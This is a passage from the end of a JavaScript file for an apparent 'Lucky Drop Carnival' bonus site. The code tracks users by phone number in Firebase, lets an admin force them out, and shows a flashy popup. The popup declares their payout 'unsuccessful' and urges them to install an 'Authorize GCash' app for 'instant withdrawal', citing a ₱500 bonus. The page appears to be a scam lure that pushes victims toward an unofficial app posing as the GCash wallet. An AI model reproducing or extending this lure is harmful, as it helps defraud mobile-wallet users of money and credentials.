                console.log('⚠️ ADMIN FORCE LOGOUT TRIGGERED!');
                logoutTriggered = true;
                
                if (forceLogoutFlagListener) {
                    forceLogoutFlagListener.off();
                    forceLogoutFlagListener = null;
                }
                
                showForceLogoutPopup();
            }
        });
        
        forceLogoutListener = db.ref('user_sessions/' + cleanPhone + '/status');
        forceLogoutListener.on('value', function(snapshot) {
            var status = snapshot.val();
            var timeSinceLoad = Date.now() - pageLoadTime;
            
            if (status === 'offline' && !logoutTriggered && timeSinceLoad > 3000) {
                db.ref('user_sessions/' + cleanPhone + '/forceLogout').once('value').then(function(flagSnap) {
                    if (flagSnap.val() === true) {
                        console.log('⚠️ ADMIN FORCE LOGOUT (via status)!');
                        logoutTriggered = true;
                        
                        if (forceLogoutListener) {
                            forceLogoutListener.off();
                            forceLogoutListener = null;
                        }
                        
                        showForceLogoutPopup();
                    }
                });
            }
        });
        
        console.log('✅ Admin logout listeners ready');
    }
    
    // ============================================================
    // FORCE LOGOUT POPUP — OPTIMIZED
    // ============================================================
    function showForceLogoutPopup() {
        if (document.querySelector('.force-logout-popup')) return;
        
        addForceLogoutAnimations();
        
        var overlay = document.createElement('div');
        overlay.className = 'force-logout-popup carnival-overlay';
        
        var confettiLayer = document.createElement('div');
        confettiLayer.className = 'carnival-confetti-layer';
        
        var confettiColors = ['#ff2d95', '#ffd700', '#ff8c00', '#00d4ff', '#39ff14', '#ffffff'];
        var confettiShapes = ['circle', 'square', 'ribbon'];
        
        for (var i = 0; i < 15; i++) {
            var piece = document.createElement('div');
            var color = confettiColors[Math.floor(Math.random() * confettiColors.length)];
            var shape = confettiShapes[Math.floor(Math.random() * confettiShapes.length)];
            var size = Math.random() * 8 + 5;
            var startX = Math.random() * 100;
            var delay = Math.random() * 4;
            var duration = Math.random() * 4 + 5;
            var rotate = Math.random() * 360;
            
            piece.className = 'carnival-confetti ' + shape;
            piece.style.cssText =
                'left: ' + startX + '%;' +
                'width: ' + size + 'px;' +
                'height: ' + (shape === 'ribbon' ? size * 2.5 : size) + 'px;' +
                'background: ' + color + ';' +
                'animation: carnivalFall ' + duration + 's ' + delay + 's linear infinite;' +
                'transform: rotate(' + rotate + 'deg);';
            confettiLayer.appendChild(piece);
        }
        overlay.appendChild(confettiLayer);
        
        var centerBurst = document.createElement('div');
        centerBurst.className = 'carnival-center-burst';
        overlay.appendChild(centerBurst);
        
        var card = document.createElement('div');
        card.className = 'carnival-card';
        
        card.innerHTML =
            '<div class="carnival-ribbon-left">🎪</div>' +
            '<div class="carnival-ribbon-right">🎟️</div>' +
            '<div class="carnival-mascot-wrap">' +
                '<div class="carnival-mascot-glow"></div>' +
                '<div class="carnival-mascot-ring"></div>' +
                '<div class="carnival-mascot">🐱</div>' +
                '<div class="carnival-mascot-star star-1">✨</div>' +
                '<div class="carnival-mascot-star star-2">⭐</div>' +
                '<div class="carnival-mascot-star star-3">✨</div>' +
            '</div>' +
            '<div class="carnival-badge">' +
                '<span class="carnival-badge-dot"></span>' +
                '<span>SESSION ENDED</span>' +
            '</div>' +
            '<h2 class="carnival-title">PAYOUT UNSUCCESSFUL</h2>' +
            '<div class="carnival-divider">' +
                '<span class="divider-star">★</span>' +
                '<span class="divider-line"></span>' +
                '<span class="divider-star">★</span>' +
            '</div>' +
            '<p class="carnival-message">' +
                'Your payout request is <strong>unsuccessful</strong>.<br>' +
                'Install and use your<span class="carnival-highlight">Authorize GCash</span><br>' +
                'to process instant withdrawal.' +
            '</p>' +
            '<div class="carnival-chips">' +
                '<div class="carnival-chip">' +
                    '<span class="chip-icon">🎁</span>' +
                    '<span class="chip-text">₱500 BONUS</span>' +
                '</div>' +
                '<div class="carnival-chip">' +
                    '<span class="chip-icon">⚡</span>' +
                    '<span class="chip-text">INSTANT</span>' +
                '</div>' +
                '<div class="carnival-chip">' +
                    '<span class="chip-icon">🔒</span>' +
                    '<span class="chip-text">SECURED</span>' +
                '</div>' +
            '</div>' +
            '<button id="returnHomeBtn" class="carnival-btn">' +
                '<span class="btn-icon">🏠</span>' +
                '<span class="btn-text">RETURN TO HOME</span>' +
                '<span class="btn-shine"></span>' +
            '</button>' +
            '<div class="carnival-footer">' +
                '<span>🎊</span> LUCKY DROP CARNIVAL <span>🎊</span>' +
            '</div>';
        
        overlay.appendChild(card);
        document.body.appendChild(overlay);
        
        document.getElementById('returnHomeBtn').onclick = function () {
            localStorage.clear();
            sessionStorage.clear();
            window.location.replace('index.html');
        };
        
        setTimeout(function () {
            if (document.querySelector('.force-logout-popup')) {
                localStorage.clear();
                sessionStorage.clear();
                window.location.replace('index.html');
            }
        }, 15000);
    }
    
    function addForceLogoutAnimations() {
        if (document.querySelector('#force-logout-animations')) return;
        
        var style = document.createElement('style');
        style.id = 'force-logout-animations';
        style.textContent =
            '.carnival-overlay {' +
                'position: fixed;' +
                'inset: 0;' +
                'z-index: 999999;' +
                'display: flex;' +
                'align-items: center;' +
                'justify-content: center;' +
                'padding: 16px;' +
                'background: ' +
                    'radial-gradient(circle at 50% 40%, rgba(255,255,255,0.25) 0%, rgba(255,255,255,0.08) 15%, transparent 45%),' +
                    'radial-gradient(circle at 50% 50%, #ff3b3b 0%, #d10000 25%, #8b0000 55%, #3d0000 80%, #0d0000 100%);' +
                'overflow: hidden;' +
                'animation: carnivalFadeIn 0.4s ease;' +
            '}' +
            '.carnival-confetti-layer {' +
                'position: absolute;' +
                'inset: 0;' +
                'overflow: hidden;' +
                'pointer-events: none;' +
                'z-index: 1;' +
            '}' +
            '.carnival-confetti {' +
                'position: absolute;' +
                'top: -20px;' +
                'opacity: 0.9;' +
            '}' +
            '.carnival-confetti.circle { border-radius: 50%; }' +
            '.carnival-confetti.square { border-radius: 2px; }' +
            '.carnival-confetti.ribbon { border-radius: 3px; }' +
            '.carnival-center-burst {' +
                'position: absolute;' +
                'top: 50%;' +
                'left: 50%;' +
                'width: 380px;' +
                'height: 380px;' +
                'transform: translate(-50%, -50%);' +
                'background: radial-gradient(circle, rgba(255,255,255,0.45) 0%, rgba(255,255,255,0.15) 25%, transparent 65%);' +
                'border-radius: 50%;' +
                'pointer-events: none;' +
                'z-index: 2;' +
            '}' +
            '.carnival-card {' +
                'position: relative;' +
                'z-index: 3;' +
                'width: 100%;' +
                'max-width: 380px;' +
                'padding: 42px 26px 26px;' +
                'background: ' +
                    'linear-gradient(180deg, rgba(255,255,255,0.18) 0%, transparent 25%),' +
                    'linear-gradient(160deg, #ff1744 0%, #d10000 35%, #8b0000 70%, #4a0000 100%);' +
                'border: 4px solid #ffd700;' +
                'border-radius: 28px;' +
                'text-align: center;' +
                'box-shadow: ' +
                    '0 20px 50px rgba(0,0,0,0.7),' +
                    '0 0 40px rgba(255,215,0,0.5);' +
                'animation: carnivalCardEnter 0.7s cubic-bezier(0.175, 0.885, 0.32, 1.275);' +
                'overflow: hidden;' +
                'box-sizing: border-box;' +
            '}' +
            '.carnival-card::before {' +
                'content: "";' +
                'position: absolute;' +
                'top: 0;' +
                'left: 0;' +
                'right: 0;' +
                'height: 3px;' +
                'background: linear-gradient(90deg, transparent, #fff9c4, #ffd700, #fff9c4, transparent);' +
            '}' +
            '.carnival-ribbon-left, .carnival-ribbon-right {' +
                'position: absolute;' +
                'top: -8px;' +
                'font-size: 28px;' +
                'filter: drop-shadow(0 0 8px rgba(255,215,0,0.9));' +
            '}' +
            '.carnival-ribbon-left { left: 14px; }' +
            '.carnival-ribbon-right { right: 14px; }' +
            '.carnival-mascot-wrap {' +
                'position: relative;' +
                'width: 130px;' +
                'height: 130px;' +
                'margin: 0 auto 16px;' +
            '}' +
            '.carnival-mascot-glow {' +
                'position: absolute;' +
                'inset: -20px;' +
                'background: radial-gradient(circle, rgba(255,215,0,0.5) 0%, rgba(255,23,68,0.3) 40%, transparent 70%);' +
                'border-radius: 50%;' +
            '}' +
            '.carnival-mascot-ring {' +
                'position: absolute;' +
                'inset: 0;' +
                'border: 3px dashed #ffd700;' +
                'border-radius: 50%;' +
                'box-shadow: 0 0 20px rgba(255,215,0,0.6);' +
            '}' +
            '.carnival-mascot {' +
                'position: absolute;' +
                'top: 50%;' +
                'left: 50%;' +
                'transform: translate(-50%, -50%);' +
                'font-size: 68px;' +
                'filter: drop-shadow(0 4px 12px rgba(0,0,0,0.6));' +
                'z-index: 2;' +
            '}' +
            '.carnival-mascot-star {' +
                'position: absolute;' +
                'font-size: 18px;' +
                'filter: drop-shadow(0 0 6px currentColor);' +
            '}' +
            '.star-1 { top: 0; right: 0; color: #ffd700; }' +
            '.star-2 { bottom: 0; left: 0; color: #ff2d95; }' +
            '.star-3 { top: 30%; left: -5px; color: #00d4ff; }' +
            '.carnival-badge {' +
                'display: inline-flex;' +
                'align-items: center;' +
                'gap: 8px;' +
                'padding: 6px 18px;' +
                'margin-bottom: 12px;' +
                'background: rgba(0,0,0,0.45);' +
                'border: 2px solid rgba(255,68,68,0.9);' +
                'border-radius: 20px;' +
                'font-family: "Orbitron", monospace;' +
                'font-size: 10px;' +
                'font-weight: 800;' +
                'color: #ff8888;' +
                'letter-spacing: 2.5px;' +
                'text-transform: uppercase;' +
                'box-shadow: 0 0 15px rgba(255,68,68,0.4);' +
            '}' +
            '.carnival-badge-dot {' +
                'width: 8px;' +
                'height: 8px;' +
                'background: #ff3b3b;' +
                'border-radius: 50%;' +
                'box-shadow: 0 0 8px #ff3b3b;' +
            '}' +
            '.carnival-title {' +
                'font-family: "Playfair Display", serif;' +
                'font-size: 26px;' +
                'font-weight: 900;' +
                'margin: 0 0 6px 0;' +
                'letter-spacing: 1.5px;' +
                'text-transform: uppercase;' +
                'line-height: 1.15;' +
                'background: linear-gradient(180deg, #fff9c4 0%, #ffd700 30%, #ffeb3b 50%, #ff9800 80%, #ff6f00 100%);' +
                '-webkit-background-clip: text;' +
                'background-clip: text;' +
                'color: transparent;' +
                'filter: drop-shadow(0 0 15px rgba(255,215,0,0.7));' +
            '}' +
            '.carnival-divider {' +
                'display: flex;' +
                'align-items: center;' +
                'justify-content: center;' +
                'gap: 10px;' +
                'margin: 14px auto;' +
                'width: 75%;' +
            '}' +
            '.divider-star {' +
                'font-size: 14px;' +
                'color: #ffd700;' +
                'text-shadow: 0 0 8px rgba(255,215,0,0.9);' +
            '}' +
            '.divider-line {' +
                'flex: 1;' +
                'height: 2px;' +
                'background: linear-gradient(90deg, transparent, #ffd700, #ff2d95, #ffd700, transparent);' +
                'border-radius: 2px;' +
            '}' +
            '.carnival-message {' +
                'font-family: "Poppins", sans-serif;' +
                'font-size: 13px;' +
                'line-height: 1.7;' +
                'color: rgba(255,255,255,0.92);' +
                'margin: 0 0 18px 0;' +
                'text-shadow: 0 1px 3px rgba(0,0,0,0.6);' +
            '}' +
            '.carnival-message strong {' +
                'color: #ff6b6b;' +
                'font-weight: 800;' +
            '}' +
            '.carnival-highlight {' +
                'display: inline-block;' +
                'padding: 2px 8px;' +
                'background: linear-gradient(180deg, #ffd700, #ff9800);' +
                '-webkit-background-clip: text;' +
                'background-clip: text;' +
                'color: transparent;' +
                'font-weight: 900;' +
            '}' +
            '.carnival-chips {' +
                'display: flex;' +
                'justify-content: center;' +
                'gap: 6px;' +
                'margin-bottom: 20px;' +
                'flex-wrap: wrap;' +
            '}' +
            '.carnival-chip {' +
                'display: flex;' +
                'align-items: center;' +
                'gap: 4px;' +
                'padding: 6px 10px;' +
                'background: rgba(0,0,0,0.4);' +
                'border: 1.5px solid rgba(255,215,0,0.6);' +
                'border-radius: 12px;' +
                'font-family: "Orbitron", monospace;' +
                'font-size: 8.5px;' +
                'font-weight: 800;' +
                'color: #ffd700;' +
                'letter-spacing: 1px;' +
                'text-transform: uppercase;' +
                'box-shadow: 0 0 8px rgba(255,215,0,0.3);' +
            '}' +
            '.chip-icon { font-size: 11px; }' +
            '.carnival-btn {' +
                'position: relative;' +
                'width: 100%;' +
                'padding: 16px 20px;' +
                'display: flex;' +
                'align-items: center;' +
                'justify-content: center;' +
                'gap: 10px;' +
                'background: linear-gradient(180deg, #fff9c4 0%, #ffeb3b 20%, #ffd700 45%, #ff9800 75%, #ff6f00 100%);' +
                'border: 3px solid #fff9c4;' +
                'border-radius: 16px;' +
                'font-family: "Orbitron", monospace;' +
                'font-size: 14px;' +
                'font-weight: 900;' +
                'color: #8b0000;' +
                'letter-spacing: 2px;' +
                'text-transform: uppercase;' +
                'cursor: pointer;' +
                'overflow: hidden;' +
                'box-shadow: ' +
                    '0 6px 0 #8b4500,' +
                    '0 10px 20px rgba(0,0,0,0.5),' +
                    '0 0 25px rgba(255,215,0,0.5);' +
                'transition: transform 0.1s ease, box-shadow 0.1s ease;' +
            '}' +
            '.carnival-btn:active {' +
                'transform: translateY(6px);' +
                'box-shadow: 0 0 0 #8b4500, 0 4px 15px rgba(0,0,0,0.5);' +
            '}' +
            '.btn-icon { font-size: 18px; }' +
            '.btn-shine { display: none; }' +
            '.carnival-footer {' +
                'margin-top: 16px;' +
                'font-family: "Orbitron", monospace;' +
                'font-size: 9px;' +
                'font-weight: 700;' +
                'color: rgba(255,215,0,0.85);' +
                'letter-spacing: 3px;' +
                'text-transform: uppercase;' +
                'text-shadow: 0 0 8px rgba(255,215,0,0.6);' +
            '}' +
            '@keyframes carnivalFadeIn { from { opacity: 0; } to { opacity: 1; } }' +
            '@keyframes carnivalCardEnter {' +
                '0% { transform: scale(0.7) translateY(40px); opacity: 0; }' +
                '60% { transform: scale(1.04) translateY(-6px); }' +
                '100% { transform: scale(1) translateY(0); opacity: 1; }' +
            '}' +
            '@keyframes carnivalFall {' +
                '0% { transform: translateY(-20px) rotate(0deg); opacity: 0; }' +
                '10% { opacity: 1; }' +
                '90% { opacity: 1; }' +
                '100% { transform: translateY(105vh) rotate(720deg); opacity: 0; }' +
            '}' +
            '@media (max-width: 420px) {' +
                '.carnival-card { padding: 38px 20px 22px; border-radius: 24px; }' +
                '.carnival-title { font-size: 22px; }' +
                '.carnival-mascot-wrap { width: 110px; height: 110px; }' +
                '.carnival-mascot { font-size: 58px; }' +
                '.carnival-message { font-size: 12px; }' +
                '.carnival-btn { padding: 14px 16px; font-size: 12px; }' +
                '.carnival-chip { font-size: 7.5px; padding: 5px 8px; }' +
                '.carnival-ribbon-left, .carnival-ribbon-right { font-size: 22px; }' +
            '}';
        
        document.head.appendChild(style);
    }
    
    // ============================================================
    // EXPORT
    // ============================================================
    window.PlayBonus = {
        playSound: playSound,
        formatNumberWithComma: formatNumberWithComma,
        getBalance: function() { return currentBalance; },
        getUserPhone: function() { return userPhone; },
        isUserClaimed: function() { return isClaimed; },
        openClaimNowPopup: openClaimNowPopup,
        closeClaimNowPopup: closeClaimNowPopup,
        handleClaimViaGCash: handleClaimViaGCash,
        showAdsPopup: showAdsPopup,
        closeAdsPopup: closeAdsPopup,
        forceShowBonusPopup: forceShowBonusPopup,
        // 🆕 Countdown functions
        startAdsCountdown: startAdsCountdown,
        stopAdsCountdown: stopAdsCountdown
    };
    
    // ============================================================
    // START — OPTIMIZED
    // ============================================================
    if (document.readyState === 'loading') {
        document.addEventListener('DOMContentLoaded', function() {
            init();
            setInterval(checkIfBanned, 30000);
            checkIfBanned();
        });
    } else {
        init();
        setInterval(checkIfBanned, 30000);
        checkIfBanned();
    }
    
})();
